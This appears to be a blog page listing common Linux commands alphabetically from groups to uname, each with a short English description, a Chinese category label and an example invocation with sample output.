<h4 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h4><p><a href="#">分类：文件管理；搜索；</a><br>The groups command displays the name of groups a user is part of.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ groups himanshu</span><br><span class="line">himanshu : himanshu adm cdrom sudo dip plugdev lpadmin sambashare</span><br></pre></td></tr></table></figure></p>
<h4 id="Gzip"><a href="#Gzip" class="headerlink" title="Gzip"></a>Gzip</h4><p><a href="#">分类：文件管理；压缩</a><br>The gzip command compresses the input file, replacing the file itself with one having a .gz extension.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gzip file1</span><br></pre></td></tr></table></figure></p>
<h4 id="Gunzip"><a href="#Gunzip" class="headerlink" title="Gunzip"></a>Gunzip</h4><p><a href="#">分类：文件管理；解压缩</a><br>Files compressed with gzip command can be restored to their original form using the gunzip command.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gunzip file1.gz</span><br></pre></td></tr></table></figure></p>
<h4 id="Head"><a href="#Head" class="headerlink" title="Head"></a>Head</h4><p><a href="#">分类：文件管理；查看文件</a><br>The head command displays the first 10 lines of the file to standard output<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ head CHANGELOG.txt</span><br><span class="line">BEEBEEP (Secure Lan Messanger)</span><br><span class="line">BeeBEEP</span><br><span class="line">2.0.4</span><br><span class="line">- Some GUI improvements (new icons, file sharing tree load faster)</span><br><span class="line">- Always Beep on new message arrived (option)</span><br><span class="line">- Favorite users (right click on user and enable star button) is on top of the list</span><br><span class="line">- improved group usability</span><br><span class="line">- Offline users can be removed from list (right click on an offline user in list and then remove)</span><br><span class="line">- Clear all files shared (option)</span><br><span class="line">- Load minimized at startup (option)</span><br></pre></td></tr></table></figure></p>
<h4 id="Hostname"><a href="#Hostname" class="headerlink" title="Hostname"></a>Hostname</h4><p><a href="#">分类：系统信息；host name</a><br>The hostname command not only displays the system’s host name, but lets them set it as well.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hostname</span><br><span class="line">himanshu-desktop</span><br></pre></td></tr></table></figure></p>
<h4 id="Id"><a href="#Id" class="headerlink" title="Id"></a>Id</h4><p><a href="#">分类：系统信息；用户信息</a><br>The id command prints user and group information for the current user or specified username.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ id himanshu</span><br><span class="line">uid=1000(himanshu) gid=1000(himanshu) groups=1000(himanshu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br></pre></td></tr></table></figure></p>
<h4 id="Kill"><a href="#Kill" class="headerlink" title="Kill"></a>Kill</h4><p><a href="#">分类：进程管理；</a><br>The kill command, as the name suggests, helps user kill a process by sending the TERM signal to it.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ kill [process-id]</span><br></pre></td></tr></table></figure></p>
<h4 id="Killall"><a href="#Killall" class="headerlink" title="Killall"></a>Killall</h4><p><a href="#">分类：进程管理；</a><br>The killall command lets you kill a process by name. Unlike kill - which requires ID of the process to be killed - killall just requires the name of the process.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ killall nautilus</span><br></pre></td></tr></table></figure></p>
<h4 id="Last"><a href="#Last" class="headerlink" title="Last"></a>Last</h4><p><a href="#">分类：安全管理；查看最近登录用户</a><br>The last command shows listing of last logged in users.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ last</span><br><span class="line">himanshu pts/11 :0 Thu Mar 2 09:46 still logged in</span><br><span class="line">himanshu pts/1 :0 Thu Mar 2 09:46 still logged in</span><br><span class="line">himanshu :0 :0 Thu Mar 2 09:42 still logged in</span><br><span class="line">reboot system boot 4.4.0-62-generic Thu Mar 2 09:41 - 10:36 (00:54)</span><br><span class="line">himanshu pts/14 :0 Wed Mar 1 15:17 - 15:52 (00:35)</span><br><span class="line">himanshu pts/13 :0 Wed Mar 1 14:40 - down (08:06)</span><br></pre></td></tr></table></figure></p>
<h4 id="Ldd"><a href="#Ldd" class="headerlink" title="Ldd"></a>Ldd</h4><p><a href="#">分类：软件包管理；查看一个共享库的依赖</a><br>The ldd command displays in output dependencies of a shared library.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ldd /lib/i386-linux-gnu/libcrypt-2.19.so</span><br><span class="line">linux-gate.so.1 =&gt; (0xb77df000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75da000)</span><br><span class="line">/lib/ld-linux.so.2 (0x80088000)</span><br></pre></td></tr></table></figure></p>
<h4 id="Ln"><a href="#Ln" class="headerlink" title="Ln"></a>Ln</h4><p><a href="#">分类：文件管理；链接</a><br>The ln command is used for creating link between files. For example, the following command would create a link named ‘lnk’ to a file with name ‘test.txt’:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ln test.txt lnk</span><br></pre></td></tr></table></figure></p>
<h4 id="Locate"><a href="#Locate" class="headerlink" title="Locate"></a>Locate</h4><p><a href="#">分类：文件管理；搜索</a><br>The locate command helps user find a file by name.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ locate [file-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Logname"><a href="#Logname" class="headerlink" title="Logname"></a>Logname</h4><p><a href="#">分类：登录信息；</a><br>The logname command prints the user-name of the current user.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ logname</span><br><span class="line">himanshu</span><br></pre></td></tr></table></figure></p>
<h4 id="Ls"><a href="#Ls" class="headerlink" title="Ls"></a>Ls</h4><p><a href="#">分类：文件管理；查看文件列表</a><br>The ls command lists contents of a directory in output.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls progress</span><br><span class="line">capture.png hlist.o progress progress.h sizes.c</span><br><span class="line">hlist.c LICENSE progress.1 progress.o sizes.h</span><br><span class="line">hlist.h Makefile progress.c README.md sizes.o</span><br></pre></td></tr></table></figure></p>
<h4 id="Lshw"><a href="#Lshw" class="headerlink" title="Lshw"></a>Lshw</h4><p><a href="#">分类：系统信息；查看硬件信息</a><br>The lshw command extracts and displays detailed information on the hardware configuration of the machine.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo lshw</span><br><span class="line">[sudo] password for himanshu:</span><br><span class="line">himanshu-desktop</span><br><span class="line">description: Desktop Computer</span><br><span class="line">product: To Be Filled By O.E.M. (To Be Filled By O.E.M.)</span><br><span class="line">vendor: To Be Filled By O.E.M.</span><br><span class="line">version: To Be Filled By O.E.M.</span><br><span class="line">serial: To Be Filled By O.E.M.</span><br><span class="line">width: 32 bits</span><br><span class="line">capabilities: smbios-2.6 dmi-2.6 smp-1.4 smp</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">..</span><br></pre></td></tr></table></figure></p>
<h4 id="Lscpu"><a href="#Lscpu" class="headerlink" title="Lscpu"></a>Lscpu</h4><p><a href="#">分类：系统信息；查看硬件信息-CPU </a><br>The lscpu command displays in output system’s CPU architecture information (such as number of CPUs, threads, cores, sockets, and more).<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ lscpu</span><br><span class="line">Architecture: i686</span><br><span class="line">CPU op-mode(s): 32-bit, 64-bit</span><br><span class="line">Byte Order: Little Endian</span><br><span class="line">CPU(s): 1</span><br><span class="line">On-line CPU(s) list: 0</span><br><span class="line">Thread(s) per core: 1</span><br><span class="line">Core(s) per socket: 1</span><br><span class="line">Socket(s): 1</span><br><span class="line">Vendor ID: AuthenticAMD</span><br><span class="line">CPU family: 16</span><br><span class="line">Model: 6</span><br><span class="line">Stepping: 3</span><br><span class="line">CPU MHz: 2800.234</span><br><span class="line">BogoMIPS: 5600.46</span><br><span class="line">Virtualization: AMD-V</span><br><span class="line">L1d cache: 64K</span><br><span class="line">L1i cache: 64K</span><br><span class="line">L2 cache: 1024K</span><br></pre></td></tr></table></figure></p>
<h4 id="Man"><a href="#Man" class="headerlink" title="Man"></a>Man</h4><p><a href="#">分类：帮助；</a><br>man lets you access reference manual for commands, programs/utilities, as well as functions.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ man ls</span><br></pre></td></tr></table></figure></p>
<h4 id="Md5sum"><a href="#Md5sum" class="headerlink" title="Md5sum"></a>Md5sum</h4><p><a href="#">分类：计算器；md5</a><br>The md5sum command lets you print  or check MD5 (128-bit) checksums.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ md5sum test.txt</span><br><span class="line">ac34b1f34803a6691ff8b732bb97fbba test.txt</span><br></pre></td></tr></table></figure></p>
<h4 id="Mkdir"><a href="#Mkdir" class="headerlink" title="Mkdir"></a>Mkdir</h4><p><a href="#">分类：文件管理；创建目录</a><br>The mkdir command lets you create directories.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mkdir [dir-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Mkfifo"><a href="#Mkfifo" class="headerlink" title="Mkfifo"></a>Mkfifo</h4><p><a href="#">分类：进程管理</a><br>The mkfifo command is used to create named pipes.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mkfifo [pipe-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p><a href="#">分类：交互</a><br>more is basically a filter for paging through text one screenful at a time.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat [large-file] | more</span><br></pre></td></tr></table></figure></p>
<h4 id="Mv"><a href="#Mv" class="headerlink" title="Mv"></a>Mv</h4><p><a href="#">分类：文件管理；移动</a><br>The mv command lets you either move a file from one directory to another, or rename it.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mv test.txt /home/himanshu/Desktop/</span><br></pre></td></tr></table></figure></p>
<h4 id="Nice"><a href="#Nice" class="headerlink" title="Nice"></a>Nice</h4><p><a href="#">分类：进程管理；指定进程优先级</a><br>The nice command lets you run a program with modified scheduling priority.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nice -n[niceness-value] [program]</span><br><span class="line"></span><br><span class="line">$ nice -n15 vim</span><br></pre></td></tr></table></figure></p>
<h4 id="Nl"><a href="#Nl" class="headerlink" title="Nl"></a>Nl</h4><p><a href="#">分类：文件管理；输出行号</a><br>The nl command writes contents of a file to output, and prepends each line with line number.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nl file1</span><br><span class="line">1 Hi</span><br><span class="line">2 How are you</span><br><span class="line">3 Bye</span><br></pre></td></tr></table></figure></p>
<h4 id="Nm"><a href="#Nm" class="headerlink" title="Nm"></a>Nm</h4><p><a href="#">分类：文件管理</a><br>The nm command is used to display symbols from object files.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nm test</span><br><span class="line">0804a020 B __bss_start</span><br><span class="line">0804841d T compare</span><br><span class="line">0804a020 b completed.6591</span><br><span class="line">0804a018 D __data_start</span><br><span class="line">0804a018 W data_start</span><br><span class="line">08048360 t deregister_tm_clones</span><br><span class="line">080483d0 t __do_global_dtors_aux</span><br><span class="line">08049f0c t __do_global_dtors_aux_fini_array_entry</span><br><span class="line">0804a01c D __dso_handle</span><br><span class="line">08049f14 d _DYNAMIC</span><br><span class="line">0804a020 D _edata</span><br><span class="line">0804a024 B _end</span><br><span class="line">080484e4 T _fini</span><br><span class="line">080484f8 R _fp_hw</span><br><span class="line">080483f0 t frame_dummy</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="Nproc"><a href="#Nproc" class="headerlink" title="Nproc"></a>Nproc</h4><p><a href="#">分类：进程管理</a><br>The nproc command displays the number of processing units available to the current process.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nproc</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p>
<h4 id="Od"><a href="#Od" class="headerlink" title="Od"></a>Od</h4><p><a href="#">分类：文件管理</a><br>The od command lets you dump files in octal as well as some other formats.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ od /bin/ls</span><br><span class="line">0000000 042577 043114 000401 000001 000000 000000 000000 000000</span><br><span class="line">0000020 000002 000003 000001 000000 140101 004004 000064 000000</span><br><span class="line">0000040 122104 000001 000000 000000 000064 000040 000011 000050</span><br><span class="line">0000060 000034 000033 000006 000000 000064 000000 100064 004004</span><br><span class="line">0000100 100064 004004 000440 000000 000440 000000 000005 000000</span><br><span class="line">0000120 000004 000000 000003 000000 000524 000000 100524 004004</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<h4 id="Passwd"><a href="#Passwd" class="headerlink" title="Passwd"></a>Passwd</h4><p><a href="#">分类：用户权限管理</a><br>The passwd command is used for changing passwords for user accounts.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ passwd himanshu</span><br><span class="line">Changing password for himanshu.</span><br><span class="line">(current) UNIX password:</span><br></pre></td></tr></table></figure></p>
<h4 id="Paste"><a href="#Paste" class="headerlink" title="Paste"></a>Paste</h4><p><a href="#">分类：交互</a><br>The paste command lets you merge lines of files. For example, if ‘file1’ contains the following lines:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat file1</span><br><span class="line">Hi</span><br><span class="line">My name is</span><br><span class="line">Himanshu</span><br><span class="line">Arora</span><br><span class="line">I</span><br><span class="line">Am</span><br><span class="line">a</span><br><span class="line">Linux researcher</span><br><span class="line">and tutorial</span><br><span class="line">writer</span><br><span class="line">Then the following &#x27;paste&#x27; command will join all the lines of the file:</span><br><span class="line"></span><br><span class="line">$ paste -s file1</span><br><span class="line">Hi My name is Himanshu Arora I Am a Linux researcher and tutorial writer</span><br></pre></td></tr></table></figure></p>
<h4 id="Pidof"><a href="#Pidof" class="headerlink" title="Pidof"></a>Pidof</h4><p><a href="#">分类：进程管理</a><br>The pidof command gives you the process ID of a running program/process.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pidof nautilus</span><br><span class="line">2714</span><br></pre></td></tr></table></figure></p>
<h4 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h4><p><a href="#">分类：网络管理</a><br>The ping command is used to check whether or not a system is up and responding. It sends ICMP ECHO_REQUEST to network hosts.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ping howtoforge.com</span><br><span class="line">PING howtoforge.com (104.24.0.68) 56(84) bytes of data.</span><br><span class="line">64 bytes from 104.24.0.68: icmp_seq=1 ttl=58 time=47.3 ms</span><br><span class="line">64 bytes from 104.24.0.68: icmp_seq=2 ttl=58 time=51.9 ms</span><br><span class="line">64 bytes from 104.24.0.68: icmp_seq=3 ttl=58 time=57.4 ms</span><br></pre></td></tr></table></figure></p>
<h4 id="Ps"><a href="#Ps" class="headerlink" title="Ps"></a>Ps</h4><p><a href="#">分类：进程管理</a><br>The ps command displays information (in the form of a snapshot) about the currently active processes.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ps</span><br><span class="line">PID TTY TIME CMD</span><br><span class="line">4537 pts/1 00:00:00 bash</span><br><span class="line">20592 pts/1 00:00:00 ps</span><br></pre></td></tr></table></figure></p>
<h4 id="Pstree"><a href="#Pstree" class="headerlink" title="Pstree"></a>Pstree</h4><p><a href="#">分类：进程管理</a><br>The pstree command produces information about running processes in the form of a tree.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pstree</span><br><span class="line">init???ModemManager???2*[&#123;ModemManager&#125;]</span><br><span class="line">??NetworkManager???dhclient</span><br><span class="line">? ??dnsmasq</span><br><span class="line">? ??3*[&#123;NetworkManager&#125;]</span><br><span class="line">??accounts-daemon???2*[&#123;accounts-daemon&#125;]</span><br><span class="line">??acpid</span><br><span class="line">??atop</span><br></pre></td></tr></table></figure></p>
<h4 id="Pwd"><a href="#Pwd" class="headerlink" title="Pwd"></a>Pwd</h4><p>The pwd command displays the name of current/working directory.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">/home/himanshu</span><br></pre></td></tr></table></figure></p>
<h4 id="Rm"><a href="#Rm" class="headerlink" title="Rm"></a>Rm</h4><p><a href="#">分类：文件管理</a><br>The rm command lets you remove files and/or directories.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ rm [file-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Rmdir"><a href="#Rmdir" class="headerlink" title="Rmdir"></a>Rmdir</h4><p><a href="#">分类：文件管理</a><br>The rmdir command allows you delete empty directories.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ rmdir [dir-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Scp"><a href="#Scp" class="headerlink" title="Scp"></a>Scp</h4><p><a href="#">分类：文件管理</a><br>The scp command lets you securely copy files between systems on a network.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ scp [name-and-path-of-file-to-transfer] [user]@[host]:[dest-path]</span><br></pre></td></tr></table></figure></p>
<h4 id="Sdiff"><a href="#Sdiff" class="headerlink" title="Sdiff"></a>Sdiff</h4><p><a href="#">分类：文件管理；文本比对 side-by-side</a><br>The sdiff command lets you perform a side-by-side merge of differences between two files.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sdiff file1 file2</span><br></pre></td></tr></table></figure></p>
<h4 id="Sed"><a href="#Sed" class="headerlink" title="Sed"></a>Sed</h4><p><a href="#">分类：文件管理;编程工具</a><br>sed is basically a  stream editor that allows users to perform basic text transformations on an input stream (a file or input from a pipeline).<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo &quot;Welcome to Howtoforge&quot; | sed -e &#x27;s/Howtoforge/HowtoForge/g&#x27;</span><br><span class="line">Welcome to HowtoForge</span><br></pre></td></tr></table></figure></p>
<h4 id="Seq"><a href="#Seq" class="headerlink" title="Seq"></a>Seq</h4><p><a href="#">分类：计算器</a><br>The seq commands prints numbers from FIRST to LAST, in steps of INCREMENT. For example, if FIRST is 1, LAST is 10, and INCREMENT is 2, then here’s the output this command produces:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ seq 1 2 10</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
<h4 id="Sha1sum"><a href="#Sha1sum" class="headerlink" title="Sha1sum"></a>Sha1sum</h4><p><a href="#">分类：计算器</a><br>The sha1sum command is used to print or check SHA1 (160-bit) checksums.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sha1sum test.txt</span><br><span class="line">955e48dfc9256866b3e5138fcea5ea0406105e68 test.txt</span><br></pre></td></tr></table></figure></p>
<h4 id="Shutdown"><a href="#Shutdown" class="headerlink" title="Shutdown"></a>Shutdown</h4><p>The shutdown command lets user shut the system in a safe way.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ shutdown</span><br></pre></td></tr></table></figure></p>
<h4 id="Size"><a href="#Size" class="headerlink" title="Size"></a>Size</h4><p><a href="#">分类：文件管理</a><br>The size command lists the section sizes as well as the total size for an object or archive file.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ size test</span><br><span class="line">text data bss dec hex filename</span><br><span class="line">1204 280 4 1488 5d0 test</span><br></pre></td></tr></table></figure></p>
<h4 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h4><p>The sleep command lets user specify delay for a specified amount of time. You can use it to delay an operation like:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sleep 10; shutdown</span><br></pre></td></tr></table></figure></p>
<h4 id="Sort"><a href="#Sort" class="headerlink" title="Sort"></a>Sort</h4><p><a href="#">分类：文件管理</a><br>The sort command lets you sort lines of text files. For example, if ‘file2’ contains the following names:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat file2</span><br><span class="line">zeus</span><br><span class="line">kyan</span><br><span class="line">sam</span><br><span class="line">adam</span><br><span class="line">Then running the sort command produces the following output:</span><br><span class="line"></span><br><span class="line">$ sort file2</span><br><span class="line">adam</span><br><span class="line">kyan</span><br><span class="line">sam</span><br><span class="line">zeus</span><br></pre></td></tr></table></figure></p>
<h4 id="Split"><a href="#Split" class="headerlink" title="Split"></a>Split</h4><p><a href="#">分类：文件管理</a><br>The split command, as the name suggests, splits a file into fixed-size pieces. By default, files with name like xaa, xab, and xac are produced.</p>
<p>$ split [file-name]</p>
<h4 id="Ssh"><a href="#Ssh" class="headerlink" title="Ssh"></a>Ssh</h4><p>ssh is basically OpenSSH SSH client. It provides secure encrypted communication between two untrusted hosts over an insecure network.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh [user-name]@[remote-server]</span><br></pre></td></tr></table></figure></p>
<h4 id="Stat"><a href="#Stat" class="headerlink" title="Stat"></a>Stat</h4><p><a href="#">分类：文件管理</a><br>The stat command displays status related to a file or a file-system.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ stat test.txt</span><br><span class="line">File: ‘test.txt’</span><br><span class="line">Size: 20 Blocks: 8 IO Block: 4096 regular file</span><br><span class="line">Device: 801h/2049d Inode: 284762 Links: 2</span><br><span class="line">Access: (0664/-rw-rw-r--) Uid: ( 0/ root) Gid: ( 0/ root)</span><br><span class="line">Access: 2017-03-03 12:41:27.791206947 +0530</span><br><span class="line">Modify: 2017-02-28 16:05:15.952472926 +0530</span><br><span class="line">Change: 2017-03-02 11:10:00.028548636 +0530</span><br><span class="line">Birth: -</span><br></pre></td></tr></table></figure></p>
<h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><p><a href="#">分类：文件管理</a><br>The strings command displays in output printable character sequences that are at least 4 characters long. For example, when a binary executable ‘test’ was passed as an argument to this command, following output was produced:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ strings test</span><br><span class="line">/lib/ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line">puts</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.0</span><br><span class="line">PTRh</span><br><span class="line">QVhI</span><br><span class="line">[^_]</span><br><span class="line">EQUAL</span><br><span class="line">;*2$&quot;</span><br><span class="line">GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<h4 id="Su"><a href="#Su" class="headerlink" title="Su"></a>Su</h4><p><a href="#">分类：用户权限管理</a><br>The su command lets you change user-identity. Mostly, this command is used to become root or superuser.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ su [user-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h4><p><a href="#">分类：用户权限管理</a><br>The sudo command lets a permitted user run a command as another user (usually root or superuser).<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo [command]</span><br></pre></td></tr></table></figure></p>
<h4 id="Sum"><a href="#Sum" class="headerlink" title="Sum"></a>Sum</h4><p><a href="#">分类：文件管理</a><br>The sum command prints checksum and block counts for each input file.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sum readme.txt</span><br><span class="line">45252 5</span><br></pre></td></tr></table></figure></p>
<h4 id="Tac"><a href="#Tac" class="headerlink" title="Tac"></a>Tac</h4><p><a href="#">分类：文件管理</a><br>The tac command prints input files in reverse. Functionality-wise, it does the reverse of what the cat command does.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat file2</span><br><span class="line">zeus</span><br><span class="line">kyan</span><br><span class="line">sam</span><br><span class="line">adam</span><br><span class="line">$ tac file2</span><br><span class="line">adam</span><br><span class="line">sam</span><br><span class="line">kyan</span><br><span class="line">zeus</span><br></pre></td></tr></table></figure></p>
<h4 id="Tail"><a href="#Tail" class="headerlink" title="Tail"></a>Tail</h4><p><a href="#">分类：文件管理</a><br>The tail command displays in output the last 10 lines of a file.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tail [file-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Talk"><a href="#Talk" class="headerlink" title="Talk"></a>Talk</h4><p><a href="#">分类：网络管理</a><br>The talk command lets users talk with each other.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ talk [user-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Tar"><a href="#Tar" class="headerlink" title="Tar"></a>Tar</h4><p><a href="#">分类：文件管理；压缩&amp;解压缩</a><br>tar is an archiving utility that lets you create as well as extract archive files. For example, to create archive.tar from files ‘foo’ and ‘bar’, use the following command:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tar -cf archive.tar foo bar</span><br><span class="line"></span><br><span class="line">More...</span><br></pre></td></tr></table></figure></p>
<h4 id="Tee"><a href="#Tee" class="headerlink" title="Tee"></a>Tee</h4><p><a href="#">分类：文件管理</a><br>The tee command reads from standard input and write to standard output as well as files.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uname | tee file2</span><br><span class="line">Linux</span><br><span class="line">$ cat file2</span><br><span class="line">Linux</span><br></pre></td></tr></table></figure></p>
<h4 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h4><p><a href="#">分类：计算器</a><br>The test command checks file types and compare values. For example, you can use it in the following way:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ test 7 -gt 5 &amp;&amp; echo &quot;true&quot;</span><br><span class="line">true</span><br></pre></td></tr></table></figure></p>
<h4 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h4><p><a href="#">分类：性能监测</a><br>The time command is used to summarize system resource usage of a program. For example:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ time ping google.com</span><br><span class="line">PING google.com (216.58.220.206) 56(84) bytes of data.</span><br><span class="line">64 bytes from del01s08-in-f14.1e100.net (216.58.220.206): icmp_seq=1 ttl=52 time=44.2 ms</span><br><span class="line">^C</span><br><span class="line">--- google.com ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 44.288/44.288/44.288/0.000 ms</span><br><span class="line">real 0m0.676s</span><br><span class="line">user 0m0.000s</span><br><span class="line">sys 0m0.000s</span><br></pre></td></tr></table></figure></p>
<h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h4><p><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load">分类：系统信息；性能监测；性能概览。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;</a><br>The top command gives  a dynamic real-time view of a running system (in terms of its processes). For example:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ top</span><br></pre></td></tr></table></figure></p>
<ul>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单(Netflix版)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
</ul>
<h4 id="Touch"><a href="#Touch" class="headerlink" title="Touch"></a>Touch</h4><p><a href="#">分类：文件管理</a><br>The touch command lets you change file timestamps (the access and modification times). When name of a non-existent file is passed as an argument, that file gets created.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ touch [file-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Tr"><a href="#Tr" class="headerlink" title="Tr"></a>Tr</h4><p><a href="#">分类：文件管理</a><br>The tr command can be used to translate/squeeze/delete characters. For example, here’s how you can use it to convert lowercase characters to uppercase:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo &#x27;howtoforge&#x27; | tr &quot;[:lower:]&quot; &quot;[:upper:]&quot;</span><br><span class="line">HOWTOFORGE</span><br></pre></td></tr></table></figure></p>
<h4 id="Tty"><a href="#Tty" class="headerlink" title="Tty"></a>Tty</h4><p><a href="#">分类：资源管理</a><br>The tty command prints the filename of the terminal connected to standard input.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tty</span><br><span class="line">/dev/pts/10</span><br></pre></td></tr></table></figure></p>
<h4 id="Uname"><a href="#Uname" class="headerlink" title="Uname"></a>Uname</h4><p><a href="#">分类：用户权限管理</a><br>The uname command prints certain system information.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">Linux himanshu-desktop 4.4.0-62-generic #83~14.04.1-Ubuntu SMP Wed Jan 18 18:10:26 UTC 2017 i686 athlon i686 GNU/Linux</span><br></pre></td></tr></table></figure></p>
